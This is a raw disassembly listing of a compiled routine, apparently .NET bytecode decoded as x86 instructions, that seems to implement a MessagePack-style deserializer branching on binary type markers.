  403654:	18 6f 45             	sbb    %ch,0x45(%edi)
  403657:	00 00                	add    %al,(%eax)
  403659:	0a 26                	or     (%esi),%ah
  40365b:	07                   	pop    %es
  40365c:	28 26                	sub    %ah,(%esi)
  40365e:	00 00                	add    %al,(%eax)
  403660:	06                   	push   %es
  403661:	0b 07                	or     (%edi),%eax
  403663:	16                   	push   %ss
  403664:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  403668:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  40366b:	8d 57 00             	lea    0x0(%edi),%edx
  40366e:	00 01                	add    %al,(%ecx)
  403670:	0b 03                	or     (%ebx),%eax
  403672:	07                   	pop    %es
  403673:	16                   	push   %ss
  403674:	08 6f 45             	or     %ch,0x45(%edi)
  403677:	00 00                	add    %al,(%eax)
  403679:	0a 26                	or     (%esi),%ah
  40367b:	02 07                	add    (%edi),%al
  40367d:	28 47 00             	sub    %al,0x0(%edi)
  403680:	00 06                	add    %al,(%esi)
  403682:	2a 06                	sub    (%esi),%al
  403684:	20 c6                	and    %al,%dh
  403686:	00 00                	add    %al,(%eax)
  403688:	00 33                	add    %dh,(%ebx)
  40368a:	39 1a                	cmp    %ebx,(%edx)
  40368c:	8d 57 00             	lea    0x0(%edi),%edx
  40368f:	00 01                	add    %al,(%ecx)
  403691:	0b 03                	or     (%ebx),%eax
  403693:	07                   	pop    %es
  403694:	16                   	push   %ss
  403695:	1a 6f 45             	sbb    0x45(%edi),%ch
  403698:	00 00                	add    %al,(%eax)
  40369a:	0a 26                	or     (%esi),%ah
  40369c:	07                   	pop    %es
  40369d:	28 26                	sub    %ah,(%esi)
  40369f:	00 00                	add    %al,(%eax)
  4036a1:	06                   	push   %es
  4036a2:	0b 07                	or     (%edi),%eax
  4036a4:	16                   	push   %ss
  4036a5:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4036a9:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4036ac:	8d 57 00             	lea    0x0(%edi),%edx
  4036af:	00 01                	add    %al,(%ecx)
  4036b1:	0b 03                	or     (%ebx),%eax
  4036b3:	07                   	pop    %es
  4036b4:	16                   	push   %ss
  4036b5:	08 6f 45             	or     %ch,0x45(%edi)
  4036b8:	00 00                	add    %al,(%eax)
  4036ba:	0a 26                	or     (%esi),%ah
  4036bc:	02 07                	add    (%edi),%al
  4036be:	28 47 00             	sub    %al,0x0(%edi)
  4036c1:	00 06                	add    %al,(%esi)
  4036c3:	2a 06                	sub    (%esi),%al
  4036c5:	20 c7                	and    %al,%bh
  4036c7:	00 00                	add    %al,(%eax)
  4036c9:	00 2e                	add    %ch,(%esi)
  4036cb:	10 06                	adc    %al,(%esi)
  4036cd:	20 c8                	and    %cl,%al
  4036cf:	00 00                	add    %al,(%eax)
  4036d1:	00 2e                	add    %ch,(%esi)
  4036d3:	08 06                	or     %al,(%esi)
  4036d5:	20 c9                	and    %cl,%cl
  4036d7:	00 00                	add    %al,(%eax)
  4036d9:	00 33                	add    %dh,(%ebx)
  4036db:	0b 72 a7             	or     -0x59(%edx),%esi
  4036de:	01 00                	add    %eax,(%eax)
  4036e0:	70 73                	jo     0x403755
  4036e2:	7b 00                	jnp    0x4036e4
  4036e4:	00 0a                	add    %cl,(%edx)
  4036e6:	7a 06                	jp     0x4036ee
  4036e8:	20 ca                	and    %cl,%dl
  4036ea:	00 00                	add    %al,(%eax)
  4036ec:	00 33                	add    %dh,(%ebx)
  4036ee:	26 1a 8d 57 00 00 01 	sbb    %es:0x1000057(%ebp),%cl
  4036f5:	0b 03                	or     (%ebx),%eax
  4036f7:	07                   	pop    %es
  4036f8:	16                   	push   %ss
  4036f9:	1a 6f 45             	sbb    0x45(%edi),%ch
  4036fc:	00 00                	add    %al,(%eax)
  4036fe:	0a 26                	or     (%esi),%ah
  403700:	07                   	pop    %es
  403701:	28 26                	sub    %ah,(%esi)
  403703:	00 00                	add    %al,(%eax)
  403705:	06                   	push   %es
  403706:	0b 02                	or     (%edx),%eax
  403708:	07                   	pop    %es
  403709:	16                   	push   %ss
  40370a:	28 7d 00             	sub    %bh,0x0(%ebp)
  40370d:	00 0a                	add    %cl,(%edx)
  40370f:	28 52 00             	sub    %dl,0x0(%edx)
  403712:	00 06                	add    %al,(%esi)
  403714:	2a 06                	sub    (%esi),%al
  403716:	20 cb                	and    %cl,%bl
  403718:	00 00                	add    %al,(%eax)
  40371a:	00 33                	add    %dh,(%ebx)
  40371c:	26 1e                	es push %ds
  40371e:	8d 57 00             	lea    0x0(%edi),%edx
  403721:	00 01                	add    %al,(%ecx)
  403723:	0b 03                	or     (%ebx),%eax
  403725:	07                   	pop    %es
  403726:	16                   	push   %ss
  403727:	1e                   	push   %ds
  403728:	6f                   	outsl  %ds:(%esi),(%dx)
  403729:	45                   	inc    %ebp
  40372a:	00 00                	add    %al,(%eax)
  40372c:	0a 26                	or     (%esi),%ah
  40372e:	07                   	pop    %es
  40372f:	28 26                	sub    %ah,(%esi)
  403731:	00 00                	add    %al,(%eax)
  403733:	06                   	push   %es
  403734:	0b 02                	or     (%edx),%eax
  403736:	07                   	pop    %es
  403737:	16                   	push   %ss
  403738:	28 7e 00             	sub    %bh,0x0(%esi)
  40373b:	00 0a                	add    %cl,(%edx)
  40373d:	28 53 00             	sub    %dl,0x0(%ebx)
  403740:	00 06                	add    %al,(%esi)
  403742:	2a 06                	sub    (%esi),%al
  403744:	20 cc                	and    %cl,%ah
  403746:	00 00                	add    %al,(%eax)
  403748:	00 33                	add    %dh,(%ebx)
  40374a:	11 03                	adc    %eax,(%ebx)
  40374c:	6f                   	outsl  %ds:(%esi),(%dx)
  40374d:	7a 00                	jp     0x40374f
  40374f:	00 0a                	add    %cl,(%edx)
  403751:	d2 0a                	rorb   %cl,(%edx)
  403753:	02 06                	add    (%esi),%al
  403755:	6e                   	outsb  %ds:(%esi),(%dx)
  403756:	28 42 00             	sub    %al,0x0(%edx)
  403759:	00 06                	add    %al,(%esi)
  40375b:	2a 06                	sub    (%esi),%al
  40375d:	20 cd                	and    %cl,%ch
  40375f:	00 00                	add    %al,(%eax)
  403761:	00 33                	add    %dh,(%ebx)
  403763:	27                   	daa
  403764:	18 8d 57 00 00 01    	sbb    %cl,0x1000057(%ebp)
  40376a:	0b 03                	or     (%ebx),%eax
  40376c:	07                   	pop    %es
  40376d:	16                   	push   %ss
  40376e:	18 6f 45             	sbb    %ch,0x45(%edi)
  403771:	00 00                	add    %al,(%eax)
  403773:	0a 26                	or     (%esi),%ah
  403775:	07                   	pop    %es
  403776:	28 26                	sub    %ah,(%esi)
  403778:	00 00                	add    %al,(%eax)
  40377a:	06                   	push   %es
  40377b:	0b 02                	or     (%edx),%eax
  40377d:	07                   	pop    %es
  40377e:	16                   	push   %ss
  40377f:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  403783:	0a 6e 28             	or     0x28(%esi),%ch
  403786:	42                   	inc    %edx
  403787:	00 00                	add    %al,(%eax)
  403789:	06                   	push   %es
  40378a:	2a 06                	sub    (%esi),%al
  40378c:	20 ce                	and    %cl,%dh
  40378e:	00 00                	add    %al,(%eax)
  403790:	00 33                	add    %dh,(%ebx)
  403792:	27                   	daa
  403793:	1a 8d 57 00 00 01    	sbb    0x1000057(%ebp),%cl
  403799:	0b 03                	or     (%ebx),%eax
  40379b:	07                   	pop    %es
  40379c:	16                   	push   %ss
  40379d:	1a 6f 45             	sbb    0x45(%edi),%ch
  4037a0:	00 00                	add    %al,(%eax)
  4037a2:	0a 26                	or     (%esi),%ah
  4037a4:	07                   	pop    %es
  4037a5:	28 26                	sub    %ah,(%esi)
  4037a7:	00 00                	add    %al,(%eax)
  4037a9:	06                   	push   %es
  4037aa:	0b 02                	or     (%edx),%eax
  4037ac:	07                   	pop    %es
  4037ad:	16                   	push   %ss
  4037ae:	28 7f 00             	sub    %bh,0x0(%edi)
  4037b1:	00 0a                	add    %cl,(%edx)
  4037b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4037b4:	28 42 00             	sub    %al,0x0(%edx)
  4037b7:	00 06                	add    %al,(%esi)
  4037b9:	2a 06                	sub    (%esi),%al
  4037bb:	20 cf                	and    %cl,%bh
  4037bd:	00 00                	add    %al,(%eax)
  4037bf:	00 33                	add    %dh,(%ebx)
  4037c1:	26 1e                	es push %ds
  4037c3:	8d 57 00             	lea    0x0(%edi),%edx
  4037c6:	00 01                	add    %al,(%ecx)
  4037c8:	0b 03                	or     (%ebx),%eax
  4037ca:	07                   	pop    %es
  4037cb:	16                   	push   %ss
  4037cc:	1e                   	push   %ds
  4037cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ce:	45                   	inc    %ebp
  4037cf:	00 00                	add    %al,(%eax)
  4037d1:	0a 26                	or     (%esi),%ah
  4037d3:	07                   	pop    %es
  4037d4:	28 26                	sub    %ah,(%esi)
  4037d6:	00 00                	add    %al,(%eax)
  4037d8:	06                   	push   %es
  4037d9:	0b 02                	or     (%edx),%eax
  4037db:	07                   	pop    %es
  4037dc:	16                   	push   %ss
  4037dd:	28 80 00 00 0a 28    	sub    %al,0x280a0000(%eax)
  4037e3:	43                   	inc    %ebx
  4037e4:	00 00                	add    %al,(%eax)
  4037e6:	06                   	push   %es
  4037e7:	2a 06                	sub    (%esi),%al
  4037e9:	20 dc                	and    %bl,%ah
  4037eb:	00 00                	add    %al,(%eax)
  4037ed:	00 33                	add    %dh,(%ebx)
  4037ef:	46                   	inc    %esi
  4037f0:	18 8d 57 00 00 01    	sbb    %cl,0x1000057(%ebp)
  4037f6:	0b 03                	or     (%ebx),%eax
  4037f8:	07                   	pop    %es
  4037f9:	16                   	push   %ss
  4037fa:	18 6f 45             	sbb    %ch,0x45(%edi)
  4037fd:	00 00                	add    %al,(%eax)
  4037ff:	0a 26                	or     (%esi),%ah
  403801:	07                   	pop    %es
  403802:	28 26                	sub    %ah,(%esi)
  403804:	00 00                	add    %al,(%eax)
  403806:	06                   	push   %es
  403807:	0b 07                	or     (%edi),%eax
  403809:	16                   	push   %ss
  40380a:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403810:	02 28                	add    (%eax),%ch
  403812:	39 00                	cmp    %eax,(%eax)
  403814:	00 06                	add    %al,(%esi)
  403816:	02 19                	add    (%ecx),%bl
  403818:	7d 24                	jge    0x40383e
  40381a:	00 00                	add    %al,(%eax)
  40381c:	04 16                	add    $0x16,%al
  40381e:	0d 2b 10 02 28       	or     $0x2802102b,%eax
  403823:	3a 00                	cmp    (%eax),%al
  403825:	00 06                	add    %al,(%esi)
  403827:	03 6f 56             	add    0x56(%edi),%ebp
  40382a:	00 00                	add    %al,(%eax)
  40382c:	06                   	push   %es
  40382d:	09 17                	or     %edx,(%edi)
  40382f:	58                   	pop    %eax
  403830:	0d 09 08 32 ec       	or     $0xec320809,%eax
  403835:	2a 06                	sub    (%esi),%al
  403837:	20 dd                	and    %bl,%ch
  403839:	00 00                	add    %al,(%eax)
  40383b:	00 33                	add    %dh,(%ebx)
  40383d:	46                   	inc    %esi
  40383e:	1a 8d 57 00 00 01    	sbb    0x1000057(%ebp),%cl
  403844:	0b 03                	or     (%ebx),%eax
  403846:	07                   	pop    %es
  403847:	16                   	push   %ss
  403848:	1a 6f 45             	sbb    0x45(%edi),%ch
  40384b:	00 00                	add    %al,(%eax)
  40384d:	0a 26                	or     (%esi),%ah
  40384f:	07                   	pop    %es
  403850:	28 26                	sub    %ah,(%esi)
  403852:	00 00                	add    %al,(%eax)
  403854:	06                   	push   %es
  403855:	0b 07                	or     (%edi),%eax
  403857:	16                   	push   %ss
  403858:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  40385e:	02 28                	add    (%eax),%ch
  403860:	39 00                	cmp    %eax,(%eax)
  403862:	00 06                	add    %al,(%esi)
  403864:	02 19                	add    (%ecx),%bl
  403866:	7d 24                	jge    0x40388c
  403868:	00 00                	add    %al,(%eax)
  40386a:	04 16                	add    $0x16,%al
  40386c:	0d 2b 10 02 28       	or     $0x2802102b,%eax
  403871:	3a 00                	cmp    (%eax),%al
  403873:	00 06                	add    %al,(%esi)
  403875:	03 6f 56             	add    0x56(%edi),%ebp
  403878:	00 00                	add    %al,(%eax)
  40387a:	06                   	push   %es
  40387b:	09 17                	or     %edx,(%edi)
  40387d:	58                   	pop    %eax
  40387e:	0d 09 08 32 ec       	or     $0xec320809,%eax
  403883:	2a 06                	sub    (%esi),%al
  403885:	20 d9                	and    %bl,%cl
  403887:	00 00                	add    %al,(%eax)
  403889:	00 33                	add    %dh,(%ebx)
  40388b:	0e                   	push   %cs
  40388c:	02 06                	add    (%esi),%al
  40388e:	03 28                	add    (%eax),%ebp
  403890:	65 00 00             	add    %al,%gs:(%eax)
  403893:	06                   	push   %es
  403894:	28 4f 00             	sub    %cl,0x0(%edi)
  403897:	00 06                	add    %al,(%esi)
  403899:	2a 06                	sub    (%esi),%al
  40389b:	20 de                	and    %bl,%dh
  40389d:	00 00                	add    %al,(%eax)
  40389f:	00 33                	add    %dh,(%ebx)
  4038a1:	52                   	push   %edx
  4038a2:	18 8d 57 00 00 01    	sbb    %cl,0x1000057(%ebp)
  4038a8:	0b 03                	or     (%ebx),%eax
  4038aa:	07                   	pop    %es
  4038ab:	16                   	push   %ss
  4038ac:	18 6f 45             	sbb    %ch,0x45(%edi)
  4038af:	00 00                	add    %al,(%eax)
  4038b1:	0a 26                	or     (%esi),%ah
  4038b3:	07                   	pop    %es
  4038b4:	28 26                	sub    %ah,(%esi)
  4038b6:	00 00                	add    %al,(%eax)
  4038b8:	06                   	push   %es
  4038b9:	0b 07                	or     (%edi),%eax
  4038bb:	16                   	push   %ss
  4038bc:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  4038c2:	02 28                	add    (%eax),%ch
  4038c4:	39 00                	cmp    %eax,(%eax)
  4038c6:	00 06                	add    %al,(%esi)
  4038c8:	02 18                	add    (%eax),%bl
  4038ca:	7d 24                	jge    0x4038f0
  4038cc:	00 00                	add    %al,(%eax)
  4038ce:	04 16                	add    $0x16,%al
  4038d0:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  4038d5:	3a 00                	cmp    (%eax),%al
  4038d7:	00 06                	add    %al,(%esi)
  4038d9:	25 03 28 64 00       	and    $0x642803,%eax
  4038de:	00 06                	add    %al,(%esi)
  4038e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4038e1:	38 00                	cmp    %al,(%eax)
  4038e3:	00 06                	add    %al,(%esi)
  4038e5:	03 6f 56             	add    0x56(%edi),%ebp
  4038e8:	00 00                	add    %al,(%eax)
  4038ea:	06                   	push   %es
  4038eb:	09 17                	or     %edx,(%edi)
  4038ed:	58                   	pop    %eax
  4038ee:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  4038f3:	2a 06                	sub    (%esi),%al
  4038f5:	20 de                	and    %bl,%dh
  4038f7:	00 00                	add    %al,(%eax)
  4038f9:	00 33                	add    %dh,(%ebx)
  4038fb:	52                   	push   %edx
  4038fc:	18 8d 57 00 00 01    	sbb    %cl,0x1000057(%ebp)
  403902:	0b 03                	or     (%ebx),%eax
  403904:	07                   	pop    %es
  403905:	16                   	push   %ss
  403906:	18 6f 45             	sbb    %ch,0x45(%edi)
  403909:	00 00                	add    %al,(%eax)
  40390b:	0a 26                	or     (%esi),%ah
  40390d:	07                   	pop    %es
  40390e:	28 26                	sub    %ah,(%esi)
  403910:	00 00                	add    %al,(%eax)
  403912:	06                   	push   %es
  403913:	0b 07                	or     (%edi),%eax
  403915:	16                   	push   %ss
  403916:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  40391c:	02 28                	add    (%eax),%ch
  40391e:	39 00                	cmp    %eax,(%eax)
  403920:	00 06                	add    %al,(%esi)
  403922:	02 18                	add    (%eax),%bl
  403924:	7d 24                	jge    0x40394a
  403926:	00 00                	add    %al,(%eax)
  403928:	04 16                	add    $0x16,%al
  40392a:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  40392f:	3a 00                	cmp    (%eax),%al
  403931:	00 06                	add    %al,(%esi)
  403933:	25 03 28 64 00       	and    $0x642803,%eax
  403938:	00 06                	add    %al,(%esi)
  40393a:	6f                   	outsl  %ds:(%esi),(%dx)
  40393b:	38 00                	cmp    %al,(%eax)
  40393d:	00 06                	add    %al,(%esi)
  40393f:	03 6f 56             	add    0x56(%edi),%ebp
  403942:	00 00                	add    %al,(%eax)
  403944:	06                   	push   %es
  403945:	09 17                	or     %edx,(%edi)
  403947:	58                   	pop    %eax
  403948:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  40394d:	2a 06                	sub    (%esi),%al
  40394f:	20 df                	and    %bl,%bh
  403951:	00 00                	add    %al,(%eax)
  403953:	00 33                	add    %dh,(%ebx)
  403955:	52                   	push   %edx
  403956:	1a 8d 57 00 00 01    	sbb    0x1000057(%ebp),%cl
  40395c:	0b 03                	or     (%ebx),%eax
  40395e:	07                   	pop    %es
  40395f:	16                   	push   %ss
  403960:	1a 6f 45             	sbb    0x45(%edi),%ch
  403963:	00 00                	add    %al,(%eax)
  403965:	0a 26                	or     (%esi),%ah
  403967:	07                   	pop    %es
  403968:	28 26                	sub    %ah,(%esi)
  40396a:	00 00                	add    %al,(%eax)
  40396c:	06                   	push   %es
  40396d:	0b 07                	or     (%edi),%eax
  40396f:	16                   	push   %ss
  403970:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  403974:	0a 0c 02             	or     (%edx,%eax,1),%cl
  403977:	28 39                	sub    %bh,(%ecx)
  403979:	00 00                	add    %al,(%eax)
  40397b:	06                   	push   %es
  40397c:	02 18                	add    (%eax),%bl
  40397e:	7d 24                	jge    0x4039a4
  403980:	00 00                	add    %al,(%eax)
  403982:	04 16                	add    $0x16,%al
  403984:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  403989:	3a 00                	cmp    (%eax),%al
  40398b:	00 06                	add    %al,(%esi)
  40398d:	25 03 28 64 00       	and    $0x642803,%eax
  403992:	00 06                	add    %al,(%esi)
  403994:	6f                   	outsl  %ds:(%esi),(%dx)
  403995:	38 00                	cmp    %al,(%eax)
  403997:	00 06                	add    %al,(%esi)
  403999:	03 6f 56             	add    0x56(%edi),%ebp
  40399c:	00 00                	add    %al,(%eax)
  40399e:	06                   	push   %es
  40399f:	09 17                	or     %edx,(%edi)
  4039a1:	58                   	pop    %eax
  4039a2:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  4039a7:	2a 06                	sub    (%esi),%al
  4039a9:	20 da                	and    %bl,%dl
  4039ab:	00 00                	add    %al,(%eax)
  4039ad:	00 33                	add    %dh,(%ebx)
  4039af:	0e                   	push   %cs
  4039b0:	02 06                	add    (%esi),%al
  4039b2:	03 28                	add    (%eax),%ebp
  4039b4:	65 00 00             	add    %al,%gs:(%eax)
  4039b7:	06                   	push   %es
  4039b8:	28 4f 00             	sub    %cl,0x0(%edi)
  4039bb:	00 06                	add    %al,(%esi)
  4039bd:	2a 06                	sub    (%esi),%al
  4039bf:	20 db                	and    %bl,%bl
  4039c1:	00 00                	add    %al,(%eax)
  4039c3:	00 33                	add    %dh,(%ebx)
  4039c5:	0e                   	push   %cs
  4039c6:	02 06                	add    (%esi),%al
  4039c8:	03 28                	add    (%eax),%ebp
  4039ca:	65 00 00             	add    %al,%gs:(%eax)
  4039cd:	06                   	push   %es
  4039ce:	28 4f 00             	sub    %cl,0x0(%edi)
  4039d1:	00 06                	add    %al,(%esi)
  4039d3:	2a 06                	sub    (%esi),%al
  4039d5:	20 d0                	and    %dl,%al
  4039d7:	00 00                	add    %al,(%eax)
  4039d9:	00 33                	add    %dh,(%ebx)
  4039db:	0f 02 03             	lar    (%ebx),%eax
  4039de:	6f                   	outsl  %ds:(%esi),(%dx)
  4039df:	7a 00                	jp     0x4039e1
  4039e1:	00 0a                	add    %cl,(%edx)
  4039e3:	67 6a 28             	addr16 push $0x28
  4039e6:	42                   	inc    %edx
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	06                   	push   %es
  4039ea:	2a 06                	sub    (%esi),%al
  4039ec:	20 d1                	and    %dl,%cl
  4039ee:	00 00                	add    %al,(%eax)
  4039f0:	00 33                	add    %dh,(%ebx)
  4039f2:	27                   	daa
  4039f3:	18 8d 57 00 00 01    	sbb    %cl,0x1000057(%ebp)
  4039f9:	0b 03                	or     (%ebx),%eax
  4039fb:	07                   	pop    %es
  4039fc:	16                   	push   %ss
  4039fd:	18 6f 45             	sbb    %ch,0x45(%edi)
  403a00:	00 00                	add    %al,(%eax)
  403a02:	0a 26                	or     (%esi),%ah
  403a04:	07                   	pop    %es
  403a05:	28 26                	sub    %ah,(%esi)
  403a07:	00 00                	add    %al,(%eax)
  403a09:	06                   	push   %es
  403a0a:	0b 02                	or     (%edx),%eax
  403a0c:	07                   	pop    %es
  403a0d:	16                   	push   %ss
  403a0e:	28 81 00 00 0a 6a    	sub    %al,0x6a0a0000(%ecx)
  403a14:	28 42 00             	sub    %al,0x0(%edx)
  403a17:	00 06                	add    %al,(%esi)
  403a19:	2a 06                	sub    (%esi),%al
  403a1b:	20 d2                	and    %dl,%dl
  403a1d:	00 00                	add    %al,(%eax)
  403a1f:	00 33                	add    %dh,(%ebx)
  403a21:	27                   	daa
  403a22:	1a 8d 57 00 00 01    	sbb    0x1000057(%ebp),%cl
  403a28:	0b 03                	or     (%ebx),%eax
  403a2a:	07                   	pop    %es
  403a2b:	16                   	push   %ss
  403a2c:	1a 6f 45             	sbb    0x45(%edi),%ch
  403a2f:	00 00                	add    %al,(%eax)
  403a31:	0a 26                	or     (%esi),%ah
  403a33:	07                   	pop    %es
  403a34:	28 26                	sub    %ah,(%esi)
  403a36:	00 00                	add    %al,(%eax)
  403a38:	06                   	push   %es
  403a39:	0b 02                	or     (%edx),%eax
  403a3b:	07                   	pop    %es
  403a3c:	16                   	push   %ss
  403a3d:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  403a41:	0a 6a 28             	or     0x28(%edx),%ch
  403a44:	42                   	inc    %edx
  403a45:	00 00                	add    %al,(%eax)
  403a47:	06                   	push   %es
  403a48:	2a 06                	sub    (%esi),%al
  403a4a:	20 d3                	and    %dl,%bl
  403a4c:	00 00                	add    %al,(%eax)
  403a4e:	00 33                	add    %dh,(%ebx)
  403a50:	25 1e 8d 57 00       	and    $0x578d1e,%eax
  403a55:	00 01                	add    %al,(%ecx)
  403a57:	0b 03                	or     (%ebx),%eax
  403a59:	07                   	pop    %es
  403a5a:	16                   	push   %ss
  403a5b:	1e                   	push   %ds
  403a5c:	6f                   	outsl  %ds:(%esi),(%dx)
  403a5d:	45                   	inc    %ebp
  403a5e:	00 00                	add    %al,(%eax)
  403a60:	0a 26                	or     (%esi),%ah
  403a62:	07                   	pop    %es
  403a63:	28 26                	sub    %ah,(%esi)
  403a65:	00 00                	add    %al,(%eax)
  403a67:	06                   	push   %es
  403a68:	0b 02                	or     (%edx),%eax
  403a6a:	07                   	pop    %es
  403a6b:	16                   	push   %ss
  403a6c:	28 82 00 00 0a 28    	sub    %al,0x280a0000(%edx)
  403a72:	42                   	inc    %edx
  403a73:	00 00                	add    %al,(%eax)
  403a75:	06                   	push   %es
  403a76:	2a 00                	sub    (%eax),%al
  403a78:	1b 30                	sbb    (%eax),%esi
  403a7a:	04 00                	add    $0x0,%al
  403a7c:	47                   	inc    %edi
  403a7d:	00 00                	add    %al,(%eax)
  403a7f:	00 11                	add    %dl,(%ecx)
  403a81:	00 00                	add    %al,(%eax)
  403a83:	11 73 79             	adc    %esi,0x79(%ebx)
  403a86:	00 00                	add    %al,(%eax)
  403a88:	0a 0a                	or     (%edx),%cl
  403a8a:	02 06                	add    (%esi),%al
  403a8c:	28 58 00             	sub    %bl,0x0(%eax)
  403a8f:	00 06                	add    %al,(%esi)
  403a91:	06                   	push   %es
  403a92:	6f                   	outsl  %ds:(%esi),(%dx)
  403a93:	75 00                	jne    0x403a95
  403a95:	00 0a                	add    %cl,(%edx)
  403a97:	d4 8d                	aam    $0x8d
  403a99:	57                   	push   %edi
  403a9a:	00 00                	add    %al,(%eax)
  403a9c:	01 0b                	add    %ecx,(%ebx)
  403a9e:	06                   	push   %es
  403a9f:	16                   	push   %ss
  403aa0:	6a 6f                	push   $0x6f
  403aa2:	4e                   	dec    %esi
  403aa3:	00 00                	add    %al,(%eax)
  403aa5:	0a 06                	or     (%esi),%al
  403aa7:	07                   	pop    %es
  403aa8:	16                   	push   %ss
  403aa9:	06                   	push   %es
  403aaa:	6f                   	outsl  %ds:(%esi),(%dx)
  403aab:	75 00                	jne    0x403aad
  403aad:	00 0a                	add    %cl,(%edx)
  403aaf:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  403ab6:	07                   	pop    %es
  403ab7:	28 a1 00 00 06 0c    	sub    %ah,0xc060000(%ecx)
  403abd:	de 0a                	fimuls (%edx)
  403abf:	06                   	push   %es
  403ac0:	2c 06                	sub    $0x6,%al
  403ac2:	06                   	push   %es
  403ac3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ac4:	33 00                	xor    (%eax),%eax
  403ac6:	00 0a                	add    %cl,(%edx)
  403ac8:	dc 08                	fmull  (%eax)
  403aca:	2a 00                	sub    (%eax),%al
  403acc:	01 10                	add    %edx,(%eax)
  403ace:	00 00                	add    %al,(%eax)
  403ad0:	02 00                	add    (%eax),%al
  403ad2:	06                   	push   %es
  403ad3:	00 35 3b 00 0a 00    	add    %dh,0xa003b
  403ad9:	00 00                	add    %al,(%eax)
  403adb:	00 13                	add    %dl,(%ebx)
  403add:	30 02                	xor    %al,(%edx)
  403adf:	00 ec                	add    %ch,%ah
  403ae1:	00 00                	add    %al,(%eax)
  403ae3:	00 0b                	add    %cl,(%ebx)
  403ae5:	00 00                	add    %al,(%eax)
  403ae7:	11 02                	adc    %eax,(%edx)
  403ae9:	7b 24                	jnp    0x403b0f
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	04 0a                	add    $0xa,%al
  403aef:	06                   	push   %es
  403af0:	45                   	inc    %ebp
  403af1:	0c 00                	or     $0x0,%al
  403af3:	00 00                	add    %al,(%eax)
  403af5:	05 00 00 00 05       	add    $0x5000000,%eax
  403afa:	00 00                	add    %al,(%eax)
  403afc:	00 98 00 00 00 a0    	add    %bl,-0x60000000(%eax)
  403b02:	00 00                	add    %al,(%eax)
  403b04:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	1e                   	push   %ds
  403b0a:	00 00                	add    %al,(%eax)
  403b0c:	00 30                	add    %dh,(%eax)
  403b0e:	00 00                	add    %al,(%eax)
  403b10:	00 42 00             	add    %al,0x0(%edx)
  403b13:	00 00                	add    %al,(%eax)
  403b15:	54                   	push   %esp
  403b16:	00 00                	add    %al,(%eax)
  403b18:	00 66 00             	add    %ah,0x0(%esi)
  403b1b:	00 00                	add    %al,(%eax)
  403b1d:	79 00                	jns    0x403b1f
  403b1f:	00 00                	add    %al,(%eax)
  403b21:	86 00                	xchg   %al,(%eax)
  403b23:	00 00                	add    %al,(%eax)
  403b25:	38 a3 00 00 00 03    	cmp    %ah,0x3000000(%ebx)
  403b2b:	28 67 00             	sub    %ah,0x0(%edi)
  403b2e:	00 06                	add    %al,(%esi)
  403b30:	2a 03                	sub    (%ebx),%al
  403b32:	02 7b 23             	add    0x23(%ebx),%bh
  403b35:	00 00                	add    %al,(%eax)
  403b37:	04 74                	add    $0x74,%al
  403b39:	4c                   	dec    %esp
  403b3a:	00 00                	add    %al,(%eax)
  403b3c:	01 28                	add    %ebp,(%eax)
  403b3e:	68 00 00 06 2a       	push   $0x2a060000
  403b43:	03 02                	add    (%edx),%eax
  403b45:	7b 23                	jnp    0x403b6a
  403b47:	00 00                	add    %al,(%eax)
  403b49:	04 a5                	add    $0xa5,%al
  403b4b:	61                   	popa
  403b4c:	00 00                	add    %al,(%eax)
  403b4e:	01 28                	add    %ebp,(%eax)
  403b50:	6e                   	outsb  %ds:(%esi),(%dx)
  403b51:	00 00                	add    %al,(%eax)
  403b53:	06                   	push   %es
  403b54:	2a 03                	sub    (%ebx),%al
  403b56:	02 7b 23             	add    0x23(%ebx),%bh
  403b59:	00 00                	add    %al,(%eax)
  403b5b:	04 a5                	add    $0xa5,%al
  403b5d:	62 00                	bound  %eax,(%eax)
  403b5f:	00 01                	add    %al,(%ecx)
  403b61:	28 6d 00             	sub    %ch,0x0(%ebp)
  403b64:	00 06                	add    %al,(%esi)
  403b66:	2a 03                	sub    (%ebx),%al
  403b68:	02 7b 23             	add    0x23(%ebx),%bh
  403b6b:	00 00                	add    %al,(%eax)
  403b6d:	04 a5                	add    $0xa5,%al
  403b6f:	6c                   	insb   (%dx),%es:(%edi)
  403b70:	00 00                	add    %al,(%eax)
  403b72:	01 28                	add    %ebp,(%eax)
  403b74:	6c                   	insb   (%dx),%es:(%edi)
  403b75:	00 00                	add    %al,(%eax)
  403b77:	06                   	push   %es
  403b78:	2a 03                	sub    (%ebx),%al
  403b7a:	02 7b 23             	add    0x23(%ebx),%bh
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	04 a5                	add    $0xa5,%al
  403b81:	63 00                	arpl   %eax,(%eax)
  403b83:	00 01                	add    %al,(%ecx)
  403b85:	28 6a 00             	sub    %ch,0x0(%edx)
  403b88:	00 06                	add    %al,(%esi)
  403b8a:	2a 03                	sub    (%ebx),%al
  403b8c:	02 7b 23             	add    0x23(%ebx),%bh
  403b8f:	00 00                	add    %al,(%eax)
  403b91:	04 a5                	add    $0xa5,%al
  403b93:	64 00 00             	add    %al,%fs:(%eax)
